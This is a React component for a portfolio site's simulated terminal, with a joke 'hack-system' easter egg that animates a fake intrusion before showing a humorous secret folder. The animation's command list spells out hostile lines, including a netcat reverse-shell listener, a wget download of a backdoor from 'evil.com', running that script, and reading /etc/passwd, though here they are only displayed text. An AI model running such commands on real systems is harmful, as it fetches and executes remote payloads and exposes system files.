"use client";

import React, { useState, useEffect, useRef, forwardRef, useImperativeHandle } from 'react';
import Image from 'next/image';
import { TerminalContainer, CommandProcessor, type CommandOutput } from './terminal-components';


interface TerminalProps {
  onShowGameButtons?: (show: boolean) => void;
}

export const Terminal = forwardRef<any, TerminalProps>(({ onShowGameButtons }, ref) => {
  const [history, setHistory] = useState<Array<{
    command: string;
    output: CommandOutput;
    timestamp: Date;
  }>>([{
    command: 'help',
    output: { 
      type: 'list', 
      content: [
        'Available commands:',
        '  help       - See a list of available commands',
        '  clear      - Clear the terminal',
        '  about      - Display info about me',
        '  projects   - List available projects',
        '  photography - Navigate to photo portfolio',
        '  contact    - Show contact information'
      ], 
      command: 'help' 
    },
    timestamp: new Date()
  }]);
  const [currentInput, setCurrentInput] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showCursor, setShowCursor] = useState(true);
  const [isHacking, setIsHacking] = useState(false);
  const [hasMadeSelection, setHasMadeSelection] = useState(false);
  const commandProcessor = useRef(new CommandProcessor());
  const historyEndRef = useRef<HTMLDivElement>(null);

  // Expose handlers to parent component
  useImperativeHandle(ref, () => ({
    handleHackSystem,
    handleOpenGame
  }));

  // Auto-scroll to bottom when new commands are added
  useEffect(() => {
    historyEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [history]);

  // Cursor blinking effect
  useEffect(() => {
    const cursorInterval = setInterval(() => {
      setShowCursor(prev => !prev);
    }, 500); // Blink every 500ms
    return () => clearInterval(cursorInterval);
  }, []);

  const handleCommandSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!currentInput.trim() || isLoading) return;
    
    const command = currentInput.trim();
    setCurrentInput('');
    setIsLoading(true);
    
    // Add command to history immediately
    const newEntry = {
      command,
      output: { type: 'text' as const, content: '', command: '' } as CommandOutput,
      timestamp: new Date()
    };
    
    setHistory(prev => [...prev, newEntry]);
    
    // Simulate processing delay
    await new Promise(resolve => setTimeout(resolve, 100));
    
    // Execute command
    const output = commandProcessor.current.executeCommand(command);
    
    // Handle special clear command
    if (output.content === 'CLEAR_TERMINAL') {
      handleClear();
      setIsLoading(false);
      return;
    }

           // Handle special continue-game command
       if (output.content === 'CONTINUE_GAME') {
         if (hasMadeSelection) {
           setHistory(prev => prev.map((entry, index) =>
             index === prev.length - 1
               ? { ...entry, output: { type: 'error', content: 'Did you really think you could change your decision? There is no going back. Unless...', command: 'continue-game' } }
               : entry
           ));
           setIsLoading(false);

           // Maintain input focus after failed continue-game
           setTimeout(() => {
             const inputElement = document.querySelector('input[type="text"]') as HTMLInputElement;
             if (inputElement) {
               inputElement.focus();
             }
           }, 50);
           return;
         }
         onShowGameButtons?.(true);
         setIsLoading(false);
         return;
       }
    
    // Update the entry with the output
    setHistory(prev => prev.map((entry, index) => 
      index === prev.length - 1 ? { ...entry, output } : entry
    ));
    
    setIsLoading(false);
    
    // Automatically refocus the input field
    setTimeout(() => {
      const inputElement = document.querySelector('input[type="text"]') as HTMLInputElement;
      if (inputElement) {
        inputElement.focus();
      }
    }, 50);
  };

  const handleClear = () => {
    // Clear everything - no initial help message
    setHistory([]);
    setIsHacking(false);
    setHasMadeSelection(false);
    commandProcessor.current.setCurrentProject(null);
    commandProcessor.current.setInTopSecret(false);
    onShowGameButtons?.(false);
    
    // Maintain input focus after clearing
    setTimeout(() => {
      const inputElement = document.querySelector('input[type="text"]') as HTMLInputElement;
      if (inputElement) {
        inputElement.focus();
      }
    }, 50);
  };

  const handleHackSystem = () => {
    setIsHacking(true);
    onShowGameButtons?.(false);
    setHasMadeSelection(true);
    
    // Add initial hack command to terminal
    setHistory(prev => [...prev, {
      command: 'hack-system',
      output: { type: 'text', content: '', command: 'hack-system' },
      timestamp: new Date()
    }]);

    // Start hacking animation sequence in terminal
    const hackSteps = [
      { command: 'sudo nmap -sS -O target.com', output: 'Scanning for open ports...', duration: 1500 },
      { command: 'python3 exploit.py --target 192.168.1.1', output: 'Exploiting vulnerability CVE-2023-1234...', duration: 2000 },
      { command: 'nc -lvp 4444', output: 'Listening for reverse shell connection...', duration: 1500 },
      { command: 'wget http://evil.com/backdoor.sh', output: 'Downloading payload...', duration: 1000 },
      { command: 'chmod +x backdoor.sh && ./backdoor.sh', output: 'Executing backdoor...', duration: 2000 },
      { command: 'cat /etc/passwd', output: 'Accessing system files...', duration: 1000 },
      { command: 'ls -la /top-secret/', output: 'Accessing secure directory...', duration: 1500 }
    ];

    let currentStep = 0;

    const addHackStep = () => {
      if (currentStep < hackSteps.length) {
        const step = hackSteps[currentStep];
        
        // Add the command
        setHistory(prev => [...prev, {
          command: step.command,
          output: { type: 'text', content: '', command: step.command },
          timestamp: new Date()
        }]);

        // Add the output after a short delay
        setTimeout(() => {
          setHistory(prev => prev.map((entry, index) => 
            index === prev.length - 1 
              ? { ...entry, output: { type: 'text', content: step.output, command: step.command } }
              : entry
          ));

          currentStep++;
          if (currentStep < hackSteps.length) {
            setTimeout(addHackStep, step.duration);
          } else {
            // Hack complete - show secret folder
            setTimeout(() => {
              setHistory(prev => [...prev, {
                command: 'ls -la /top-secret/',
                output: {
                  type: 'list',
                  content: [
                    'Access granted to: /top-secret/',
                    ' ',
                    'Available files:',
                    '  secret-recipe.txt',
                    '  instant-ramen-tierlist.txt',
                    '  backup-passwords.txt',
                    '  sensitive-images/',
                    ' ',
                    'Type [file-or-folder-name] to explore a file or folder.',
                    'Type `help` to see a list of available commands.'
                  ],
                  command: 'ls -la /top-secret/'
                },
                timestamp: new Date()
              }]);
              setIsHacking(false);
              commandProcessor.current.setInTopSecret(true);
              
              // Maintain input focus after hack completes
              setTimeout(() => {
                const inputElement = document.querySelector('input[type="text"]') as HTMLInputElement;
                if (inputElement) {
                  inputElement.focus();
                }
              }, 100);
            }, 1000);
          }
        }, 500);
      }
    };

    // Start the hacking sequence
    setTimeout(addHackStep, 1000);
  };

  const handleOpenGame = () => {
    onShowGameButtons?.(false);
    setHasMadeSelection(true);
    
    // Add game launch message to terminal
    setHistory(prev => [...prev, {
      command: 'open-game',
      output: {
        type: 'text',
        content: 'Launching Snake Game... 🐍\n\nUse WASD or Arrow Keys to control the snake.\nPress ESC to close the game.',
        command: 'open-game'
      },
      timestamp: new Date()
    }]);
  };



  return (
    <>
      <TerminalContainer
        history={history}
        currentInput={currentInput}
        onInputChange={setCurrentInput}
        onSubmit={handleCommandSubmit}
        isLoading={isLoading}
        showCursor={showCursor}
        historyEndRef={historyEndRef}
      />
      

      

    </>
  );
});
